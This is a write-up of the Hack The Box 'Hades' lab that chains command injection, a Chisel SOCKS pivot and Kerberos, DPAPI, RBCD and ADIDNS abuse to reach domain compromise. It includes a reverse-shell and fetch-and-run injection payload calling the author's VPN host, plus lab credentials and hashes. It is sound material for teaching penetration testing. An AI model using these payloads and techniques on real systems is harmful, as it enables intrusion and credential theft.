---
title: "Hack The Box Mini Pro Lab — Hades"
summary: "Hades chains command injection, an internal SOCKS pivot, Kerberos abuse, VSS/DPAPI, RBCD and ADIDNS into full Active Directory compromise."
platform: "Hack The Box"
contentType: "pro-lab"
publicationPolicy: "retired"
solvedAt: 2026-10-07
publishedAt: 2026-10-07
tags:
  - active-directory
  - command-injection
  - docker
  - pivoting
  - as-rep-roasting
  - kerberos
  - vss
  - dpapi
  - rbcd
  - adidns
  - credential-capture
tools:
  - Nmap
  - curl
  - Chisel
  - ProxyChains
  - Impacket
  - John the Ripper
  - Hashcat
  - Evil-WinRM
  - Wireshark
  - PowerMad
  - Responder
cves: []
htbUrl: "https://app.hackthebox.com/prolabs/12"
cover: "/images/writeups/hackthebox/pro-labs/hades/hades-cover-square.png"
coverAlt: "Original illustration of a winding route through an underworld cavern toward three connected servers"
featured: false
draft: false
---

> **Authorized-lab notice:** Hack The Box [explicitly permits public solutions for Hades](https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules), one of the Mini Pro Labs with an available platform write-up. This article covers only that isolated lab. All seven flag values, my VPN address, captured authentication responses and session tickets are omitted. Passwords shown below are lab-only credentials needed to explain the chain.

## Introduction

Hades is a three-host enterprise lab built around Active Directory. A website and certificate checker provide the first foothold. From there, the route crosses a Docker network boundary, an internal Windows segment, a backup snapshot, several Kerberos trust decisions and an Active Directory DNS zone. I completed the seven-flag path on 7 October 2026; this write-up reconstructs the commands and evidence from that solve.

The important distinction is that **the exposed web server is not the domain controller**. The initial shell runs in a Docker container on the WEB host. A working pivot is therefore a prerequisite for nearly every later step.

## Environment and topology

| Item | Value |
| --- | --- |
| Lab | Hades Mini Pro Lab |
| Creators | cube0x0 and egre55 |
| External entry point | `10.13.38.16` |
| Domain | `htb.local` (`HTB`) |
| Domain controller | `dc1.htb.local` / `192.168.3.203` |
| Web server | `web.htb.local` / `192.168.3.202` |
| Development server | `dev.htb.local` / `192.168.3.201` |
| Flags | Seven; values omitted |

```text
Kali (<VPN_IP>)
    |
    | HTB VPN
    v
10.13.38.16  WEB, public HTTPS entry point
    |             Windows host: 192.168.99.1, 192.168.3.202
    v
Docker container (www-data, 172.17.0.2)
    |
    | reverse SOCKS through Chisel
    v
192.168.3.0/24 internal domain network
    +-- 192.168.3.201  DEV
    +-- 192.168.3.202  WEB
    +-- 192.168.3.203  DC1
```

Replace `<VPN_IP>` in the commands below with the address assigned to your own `tun0` interface. The lab explicitly states that web brute force and scanning beyond a `/24` are unnecessary.

## Attack path at a glance

| Stage | Decisive evidence | Access or flag |
| --- | --- | --- |
| Certificate checker | A five-second command substitution and outbound HTTP callback | `www-data` in Docker; Chasm |
| Pivot | Container can reach `192.168.99.1` and the internal `/24` | SOCKS access to DC1, WEB and DEV |
| AS-REP roast | `bob` returns an AS-REP without pre-authentication | `bob` credential; Guardian on the DC share |
| Machine authentication | Printer coercion produces a DEV$ NetNTLMv1 response | DEV$ key, S4U2Self, Administrator on DEV; Messenger |
| Backup and DPAPI | VSS contains SAM, SYSTEM, DPAPI masterkey and credential files | `test-svc` password; Resurrection |
| RBCD and KeeWeb | `test-svc` has FullControl over `WEB$` | `lee` HTTP ticket, vault access, `remote_user`; Gateway |
| ADIDNS | WEB repeatedly resolves missing `db1.htb.local` | Local Administrator on WEB; Celestial |
| Domain access | WEB Administrator password also works for domain Administrator | CIFS ticket to DC1; Dominion |

## 1. Certificate checker to Docker shell — Chasm

Start with the supplied entry point:

```bash
nmap -Pn -n -p- -sVC -T4 -oA nmap-entry 10.13.38.16
```

The scan found only `443/tcp` open. Apache 2.4.29 on Ubuntu served Gigantic Hosting's HTTPS site. The Services page linked to `/ssltools/certificate.php`, a form that posts a `name` value and displays certificate details for the supplied host.

First, establish a baseline and test for command execution. Send the payload as **raw form data** so the literal shell syntax reaches the PHP code:

```bash
curl -sk --max-time 20 -o /dev/null \
  -w 'baseline: HTTP %{http_code}, %{time_total}s\n' \
  --data-raw 'name=10.13.38.16' \
  'https://10.13.38.16/ssltools/certificate.php'

curl -sk --max-time 20 -o /dev/null \
  -w 'probe: HTTP %{http_code}, %{time_total}s\n' \
  --data-raw 'name=10.13.38.16/$(sleep${IFS}5)' \
  'https://10.13.38.16/ssltools/certificate.php'
```

My normal request took about `0.26s`; the raw `sleep` probe took `5.29s` and returned HTTP 200. An earlier URL-encoded test gave HTTP 000 almost immediately, so that single result was inconclusive. The raw request and an out-of-band callback supplied the proof.

On Kali, host a marker file with `python3 -m http.server 8000 --bind <VPN_IP>`, then inject a request to it. The server log should show a GET from the target. Once confirmed, host a small reverse-shell script:

```bash
printf 'bash -i >& /dev/tcp/%s/9001 0>&1\n' '<VPN_IP>' > rev.sh
python3 -m http.server 8000 --bind '<VPN_IP>'

# In another terminal
nc -lvnp 9001
```

Trigger the request from another Kali terminal:

```bash
curl -sk --max-time 15 \
  --data-raw 'name=10.13.38.16/$(curl${IFS}-fsS${IFS}http://<VPN_IP>:8000/rev.sh|bash)' \
  'https://10.13.38.16/ssltools/certificate.php'
```

The listener received a Bash shell as `www-data`. In the recovered PHP, `$host = $_POST["name"]` is passed to a shell command shaped like `system("timeout 5 curl --insecure -v https://$host ...")`. Its blacklist removes literal spaces and some metacharacters but leaves `$()`, `${IFS}` and `|`. Command substitution runs before `curl` sees the URL.

The **Chasm** flag was in the container's certificate-checker directory:

```text
/var/www/html/ssltools/0fe092ba0_flag.txt
```

Read it in your own lab session; its value is omitted here.

## 2. Build the internal pivot

The shell's `ip -br addr` showed `172.17.0.2/16`, and `/proc/1/cgroup` showed Docker. A connection from `192.168.99.1` in the container's socket list pointed to the Windows host outside the container. Small, targeted port checks showed IIS, SMB, RPC and WinRM services on that address. A single `/24` discovery pass found LDAP on `192.168.3.203`.

Run a reverse SOCKS tunnel through the shell. A Kali-packaged Chisel binary failed in the container because it required newer GLIBC symbols. I used a statically linked Linux build instead. Download a compatible release from the [Chisel releases](https://github.com/jpillora/chisel/releases), verify it, and serve that binary from Kali:

```bash
# Kali: one terminal
chisel server --reverse -p 8001

# Kali: another terminal, in the directory containing chisel-static
python3 -m http.server 8000 --bind '<VPN_IP>'
```

```bash
# Docker shell
curl -fsS http://<VPN_IP>:8000/chisel-static -o /tmp/chisel-static
chmod 700 /tmp/chisel-static
/tmp/chisel-static client <VPN_IP>:8001 R:socks
```

The Chisel server should report a SOCKS listener at `127.0.0.1:1080`. My ProxyChains configuration contained:

```ini
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
```

Check the tunnel against a known HTTP service before launching AD tools:

```bash
curl -sS --socks5-hostname 127.0.0.1:1080 \
  -o /dev/null -w 'HTTP %{http_code}\n' \
  http://192.168.99.1/
```

I received `HTTP 401` from Microsoft IIS. That status was useful: it proved the proxy reached the internal host. A dropped Chisel session later caused false-looking `filtered` scan results; a short `curl` or `nc` check is a faster health test than repeating broad scans.

## 3. AS-REP roast and the DC share — Guardian

An anonymous LDAP rootDSE request through the SOCKS proxy disclosed `dc1.htb.local` and `DC=htb,DC=local`. Anonymous searches beneath that base failed because a successful bind was required. Try the candidate `bob` with a Kerberos AS-REP request, then crack the returned material locally:

```bash
printf 'bob\n' > candidate-users.txt
proxychains4 -q -f ./proxychains-hades.conf \
  impacket-GetNPUsers htb.local/ -no-pass \
  -usersfile candidate-users.txt -dc-ip 192.168.3.203 \
  -format hashcat -outputfile bob.asrep

john --wordlist=/usr/share/wordlists/rockyou.txt bob.asrep
john --show bob.asrep
```

The AS-REP was returned because Kerberos pre-authentication was disabled for `bob`. John recovered `Passw0rd1!`. This was **offline** cracking of one captured hash, not an online password attack.

Use the credential to list the DC's shares and enter `Users`:

```bash
proxychains4 -q -f ./proxychains-hades.conf \
  smbclient //192.168.3.203/Users -I 192.168.3.203 \
  -W HTB -U bob -p 445
```

At the `smb:` prompt, `cd bob`, `ls`, and `get flag.txt`. The downloaded file contains **Guardian**. `type` is not an `smbclient` command; use `get` and read the local copy.

With `bob`, authenticated LDAP enumeration identified `DEV`, `WEB` and `DC1`, the users `kalle`, `lee`, `remote_user`, `iis-svc` and `test-svc`, and the `Dev` and `Operations` groups. DNS over TCP resolved `dev.htb.local` to `.201`, `web.htb.local` to `.202`, and `dc1.htb.local` to `.203`. SYSVOL was readable, but the default GPO files did not expose the credential needed for the next hop.

## 4. Coerce DEV$ and impersonate Administrator — Messenger

The [printer bug implementation](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) can ask the DEV host to authenticate to an attacker-controlled listener. Set Responder's fixed challenge to `1122334455667788` in `Responder.conf`, then start Responder on the HTB VPN interface with NTLMv1 downgrade enabled:

```bash
sudo responder -I tun0 --lm
```

From another terminal, trigger the DEV host through the pivot using `bob`:

```bash
proxychains4 -q -f ./proxychains-hades.conf \
  python3 printerbug.py 'htb.local/bob:Passw0rd1!@192.168.3.201' \
  '<VPN_IP>'
```

Responder captured an `HTB\DEV$` NetNTLMv1 response. Save your own captured line privately, then use an offline attack:

```bash
john --format=netntlm --wordlist=/usr/share/wordlists/rockyou.txt dev-netntlmv1.txt
```

In my solve I checked the `dev` candidate suggested by HTB's available platform guide against my captured response. Its NT hash was `0DF5244B85806F3154907A58D7765F91`; it was a verified candidate, not an independently discovered crack.

The machine account's key allowed an S4U2Self request for `Administrator`. Change the service in the resulting ticket to HTTP on DEV so WinRM can use it:

```bash
proxychains4 -q -f ./proxychains-hades.conf \
  impacket-getST -dc-ip 192.168.3.203 \
  -hashes :0DF5244B85806F3154907A58D7765F91 \
  -self -impersonate Administrator \
  -altservice HTTP/dev.htb.local 'htb.local/DEV$'

proxychains4 -q -f ./proxychains-hades.conf \
  evil-winrm -i dev.htb.local -r HTB.LOCAL \
  -K './Administrator@HTTP_dev.htb.local@HTB.LOCAL.ccache'
```

Make sure Kali resolves `dev.htb.local` to `192.168.3.201`; Evil-WinRM will stop before connecting if local name resolution fails. The shell returned `htb\administrator`. From DEV's **local** Administrator profile, read the Desktop flag for **Messenger**. Do not assume that the profile path has a `.HTB` suffix: on my first attempt, `C:\Users\Administrator.HTB\Desktop` existed but was empty.

## 5. VSS, SAM and DPAPI — Resurrection

DEV held an old Volume Shadow Copy. In the Administrator WinRM session, enumerate and expose it:

```powershell
vssadmin list shadows
cmd.exe /c 'mklink /d C:\VSS \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\'
```

The snapshot contained two Credential Manager blobs under the Administrator's `AppData\Roaming\Microsoft\Credentials` directory, a DPAPI masterkey under the matching `Protect\<SID>` directory, and the offline `SAM` and `SYSTEM` registry hives. Stage copies in a writable directory:

```powershell
$dst = 'C:\Users\Public\HadesVSS'
New-Item -ItemType Directory -Path $dst -Force | Out-Null
$base = 'C:\VSS\Users\Administrator\AppData\Roaming\Microsoft'
$sid = 'S-1-5-21-4124311166-4116374192-336467615-500'

Copy-Item "$base\Credentials\1A2572C793495F694F64823A392D4718" $dst -Force
Copy-Item "$base\Credentials\4A2EEB30EFC7958491B6578D9948EC7F" $dst -Force
Copy-Item "$base\Protect\$sid\87790867-a883-4a2d-a467-019c315e1104" $dst -Force
Copy-Item 'C:\VSS\Windows\System32\Config\SAM' $dst -Force
Copy-Item 'C:\VSS\Windows\System32\Config\SYSTEM' "$dst\SYSTEM-fresh" -Force
```

Clear Hidden/System attributes before using Evil-WinRM's `download` command, and change into `$dst` so its `download` paths are simple. Download the three small DPAPI files and `SAM` individually. The direct transfer of the roughly 12 MB SYSTEM hive failed in my session with an Evil-WinRM Ruby error; a fresh copied hive transferred inside a ZIP:

```powershell
attrib.exe -h -s "$dst\1A2572C793495F694F64823A392D4718"
attrib.exe -h -s "$dst\4A2EEB30EFC7958491B6578D9948EC7F"
attrib.exe -h -s "$dst\87790867-a883-4a2d-a467-019c315e1104"
Compress-Archive -LiteralPath "$dst\SYSTEM-fresh" `
  -DestinationPath "$dst\SYSTEM-fresh.zip" -CompressionLevel Optimal -Force
Set-Location $dst
```

At the **Evil-WinRM prompt**, run `download 1A2572C793495F694F64823A392D4718` and repeat for the other two small files, `SAM`, and `SYSTEM-fresh.zip`. These are Evil-WinRM client commands, not PowerShell cmdlets. On Kali, test the ZIP, extract it and check that the hive is 12,320,768 bytes before passing it to Impacket. Do not silently use a partial `SYSTEM` download.

```bash
impacket-secretsdump -sam SAM -system vss-offline/SYSTEM-fresh LOCAL
```

The offline SAM dump returned the local Administrator NT hash `de53e322ea95ac2723a2e3e149874aac`. Crack it locally with `hashcat -m 1000 -a 0` and `rockyou.txt`; my result was `./*40ra26AZ`. The password unlocked the DPAPI masterkey associated with the same local Administrator SID:

```bash
impacket-dpapi masterkey \
  -file 87790867-a883-4a2d-a467-019c315e1104 \
  -sid S-1-5-21-4124311166-4116374192-336467615-500 \
  -password './*40ra26AZ'

impacket-dpapi credential \
  -file 4A2EEB30EFC7958491B6578D9948EC7F \
  -key '<DECRYPTED_MASTERKEY>'

impacket-dpapi credential \
  -file 1A2572C793495F694F64823A392D4718 \
  -key '<DECRYPTED_MASTERKEY>'
```

Use the full key printed by the first command in place of `<DECRYPTED_MASTERKEY>`. One blob revealed `htb.local\test-svc` and `T3st-S3v!ce-F0r-Pr0d`, targeted at `web`. The other credential's target was `flag`: its secret was **Resurrection**.

## 6. Abuse FullControl on WEB$ with RBCD — Gateway

Reading the `WEB$` DACL showed an `ACCESS_ALLOWED_ACE` granting `test-svc` `FullControl (0xf01ff)`. That gave the account the ability to set resource-based constrained delegation on the WEB computer object. The steps are: create a machine account we control, allow it to act on behalf of users on WEB, and request an HTTP ticket for a suitable user.

```bash
proxychains4 -q -f ./proxychains-hades.conf \
  impacket-dacledit -dc-ip 192.168.3.203 \
  -action read -principal test-svc -target 'WEB$' \
  'htb.local/test-svc:T3st-S3v!ce-F0r-Pr0d'

proxychains4 -q -f ./proxychains-hades.conf \
  impacket-addcomputer -method SAMR \
  -computer-name 'PWN1$' -computer-pass 'test123!' \
  -dc-ip 192.168.3.203 \
  'htb.local/test-svc:T3st-S3v!ce-F0r-Pr0d'

proxychains4 -q -f ./proxychains-hades.conf \
  impacket-rbcd -delegate-from 'PWN1$' -delegate-to 'WEB$' \
  -action write -dc-ip 192.168.3.203 \
  'htb.local/test-svc:T3st-S3v!ce-F0r-Pr0d'
```

An `impacket-rbcd ... -action read` confirmed that `PWN1$` was the allowed principal. The domain Administrator belongs to **Protected Users**, so impersonating that user through this delegation was not the useful route. `lee`, a member of Operations, produced the HTTP service ticket we needed:

```bash
proxychains4 -q -f ./proxychains-hades.conf \
  impacket-getST -dc-ip 192.168.3.203 \
  -spn HTTP/web.htb.local -impersonate lee \
  'htb.local/PWN1$:test123!'
```

The ticket was saved as `lee@HTTP_web.htb.local@HTB.LOCAL.ccache`. In my Kali setup, `curl --negotiate` initially returned 401 with `Matching credential not found`, before it sent any Authorization header. A small Kerberos configuration file fixed local realm mapping:

```ini
[libdefaults]
    default_realm = HTB.LOCAL
    dns_canonicalize_hostname = false
    rdns = false
    dns_lookup_realm = false

[realms]
    HTB.LOCAL = {
        kdc = 192.168.3.203
    }

[domain_realm]
    htb.local = HTB.LOCAL
    .htb.local = HTB.LOCAL
```

Save that text as `krb5-hades.conf`. The following SOCKS-routed Negotiate request sent an Authorization header and received HTTP 200:

```bash
KRB5_CONFIG="$PWD/krb5-hades.conf" \
KRB5CCNAME="FILE:$PWD/lee@HTTP_web.htb.local@HTB.LOCAL.ccache" \
curl -sS --socks5 127.0.0.1:1080 \
  --resolve web.htb.local:80:192.168.3.202 \
  --negotiate -u : -o /dev/null \
  -w 'HTTP %{http_code}\n' http://web.htb.local/
```

In a separate Firefox profile, set SOCKS5 `127.0.0.1:1080`, remote DNS, and `network.negotiate-auth.trusted-uris` to `web.htb.local,.htb.local`. Launch Firefox with the same `KRB5_CONFIG` and `KRB5CCNAME` environment and open `http://web.htb.local/`.

KeeWeb displayed `MyVault → Credentials → web.htb.local`. The entry contained `remote_user` and password `FZg28$dJe*Hx7c`. Connect to `web.htb.local` over WinRM as `HTB\remote_user`:

```bash
proxychains4 -q -f ./proxychains-hades.conf \
  evil-winrm -i web.htb.local -u remote_user -p 'FZg28$dJe*Hx7c'
```

Read the Desktop flag in the `remote_user.HTB` profile for **Gateway**:

```powershell
Get-Content -LiteralPath 'C:\Users\remote_user.HTB\Desktop\flag.txt'
```

## 7. Follow DNS queries into ADIDNS — Celestial

On WEB, `tshark.exe` was installed. `Get-NetIPAddress` failed with CIM access denied for `remote_user`, so `ipconfig.exe` identified `Ethernet0 2` as the interface with `192.168.3.202`; `tshark -D` listed it as interface `4`. A two-minute DNS capture, despite an Npcap warning, recorded queries for missing `db1.htb.local`, `db2.htb.local` and `db3.htb.local`:

```powershell
$ts = 'C:\Program Files\Wireshark\tshark.exe'
$cap = "$env:USERPROFILE\Documents\hades-web.pcapng"
& $ts -i 4 -f 'port 53' -a duration:120 -w $cap
& $ts -r $cap -Y 'dns.flags.response == 0 && dns.qry.name' `
  -T fields -e ip.src -e dns.qry.name | Sort-Object -Unique
```

The missing name `db1` was the opportunity: if it resolved to the Kali listener, a scheduled or recurring WEB request could authenticate to us. Load the [PowerMad](https://github.com/Kevin-Robertson/Powermad) script in the authorized WEB session, then use the `remote_user` credential to add an AD-integrated DNS record:

```powershell
$pw = ConvertTo-SecureString 'FZg28$dJe*Hx7c' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\remote_user', $pw)

New-ADIDNSNode -Node db1 -Data <VPN_IP> `
  -DomainController dc1.htb.local -Domain htb.local `
  -Zone htb.local -Forest htb.local -Credential $cred -Verbose
```

Start Responder on `tun0` (`sudo responder -I tun0`) to receive the follow-up authentication. `New-ADIDNSNode` reported success, but an immediate DNS A query still had `ANSWER: 0`. I waited for the zone change to take effect rather than adding more records. Responder later captured a NetNTLMv2 authentication for `administrator`, confirming that the redirect did become effective. Keep that response in a private file; it is intentionally not reproduced here.

For offline cracking, use `hashcat -m 5600` with an appropriate candidate list or rule (the platform guide suggests `rockyou.txt` plus Hashcat's `d3ad0ne.rule`). In my run I tested `Myp@ssw0rd`, a candidate suggested by that guide, against **my own captured response**; Hashcat reported `Recovered 1/1`. This was candidate verification, not an independent wordlist recovery. The same password worked for WEB's **local** Administrator:

```bash
proxychains4 -q -f ./proxychains-hades.conf \
  impacket-psexec -target-ip 192.168.3.202 Administrator@web.htb.local
```

After entering the password, the shell reported `nt authority\system`. Read `C:\Users\Administrator\Desktop\flag.txt` for **Celestial**.

## 8. Kerberos access to DC1 — Dominion

The local Administrator password was reused by the domain Administrator. Because this domain account is in Protected Users, use Kerberos for the DC rather than relying on NTLM. Request a ticket for the DC's CIFS service:

```bash
proxychains4 -q -f ./proxychains-hades.conf \
  impacket-getST -dc-ip 192.168.3.203 \
  -spn cifs/dc1.htb.local 'htb.local/Administrator'
```

The command accepted the password and wrote a CIFS ccache for `dc1.htb.local`. Kerberos PsExec authenticated and found `ADMIN$`, but my run hung after starting its temporary service. The CIFS ticket already permitted file access, so SMBclient was enough:

```bash
KRB5CCNAME="$PWD/Administrator@cifs_dc1.htb.local@HTB.LOCAL.ccache" \
proxychains4 -q -f ./proxychains-hades.conf \
  impacket-smbclient -k -no-pass \
  -dc-ip 192.168.3.203 -target-ip 192.168.3.203 \
  'htb.local/Administrator@dc1.htb.local'
```

At the Impacket SMB prompt:

```text
# use C$
# cat Users/Administrator.HTB/Desktop/flag.txt
```

The file contained **Dominion**, completing the lab. `whoami` and `dir` are shell commands, not Impacket SMBclient commands; use its `help` list when a command is rejected.

## Flag locations

| Flag | Where it was found |
| --- | --- |
| Chasm | Docker: `/var/www/html/ssltools/0fe092ba0_flag.txt` |
| Guardian | DC1 SMB share: `Users\bob\flag.txt` |
| Messenger | DEV: local Administrator's Desktop after S4U2Self |
| Resurrection | DPAPI Credential Manager blob with target `flag` in DEV's VSS |
| Gateway | WEB: `C:\Users\remote_user.HTB\Desktop\flag.txt` |
| Celestial | WEB: `C:\Users\Administrator\Desktop\flag.txt` |
| Dominion | DC1: `C:\Users\Administrator.HTB\Desktop\flag.txt` via SMB |

## What did not work

- A URL-encoded timing probe returned HTTP 000 too quickly to establish command execution. The raw POST, five-second delay and outbound callback settled it.
- The normal Chisel binary required GLIBC versions absent in the Docker container. A static build kept the pivot running.
- Nmap through a dropped SOCKS session labelled LDAP as filtered. Proxy health checks and a direct TCP connect through the tunnel showed the real state.
- An anonymous LDAP base search could read rootDSE, but a subtree search needed authenticated bind.
- Evil-WinRM's direct download of the SYSTEM hive failed; a fresh copy packaged as ZIP supplied a valid offline hive.
- Curl's first Kerberos Negotiate request lacked an Authorization header. Explicit realm mapping fixed the local ticket-selection problem.
- The immediate DNS lookup after `New-ADIDNSNode` returned no A answer. The later NetNTLMv2 capture was the evidence that the route had become active.
- Kerberos PsExec on DC1 stalled after service start. SMBclient reused the authenticated CIFS ticket without a remote shell.

## Lessons learned

The web blacklist did not make shell execution safe; the design needed to avoid a shell around untrusted input. The Docker boundary limited the initial foothold, but reverse SOCKS made the internal services reachable. AD enumeration mattered because each credential and permission led to a different trust boundary: pre-authentication on `bob`, a machine account key on DEV, offline secrets in VSS, `FullControl` on `WEB$`, and a writable AD DNS zone. Finally, a service ticket was enough to meet the objective even when the preferred remote-execution tool hung.

## Defensive takeaways

- Replace shell-based certificate checks with an API that accepts a validated host value as data, and constrain outbound web-server access.
- Require Kerberos pre-authentication for user accounts and monitor AS-REP requests, NTLMv1 and unusual machine-account authentication.
- Protect VSS snapshots and DPAPI material as credential-bearing backups; remove obsolete snapshots and limit local Administrator password reuse.
- Audit computer-object DACLs, machine-account creation and `msDS-AllowedToActOnBehalfOfOtherIdentity` changes.
- Restrict who can create AD-integrated DNS nodes, and investigate new internal names that resolve to external or VPN addresses.
- Disable unnecessary legacy authentication and avoid reusing local Administrator passwords as domain account passwords.

## References

- [Hack The Box Platform Rules — content sharing](https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules)
- [Chisel releases](https://github.com/jpillora/chisel/releases)
- [Printer coercion utility in krbrelayx](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
- [PowerMad ADIDNS tooling](https://github.com/Kevin-Robertson/Powermad)
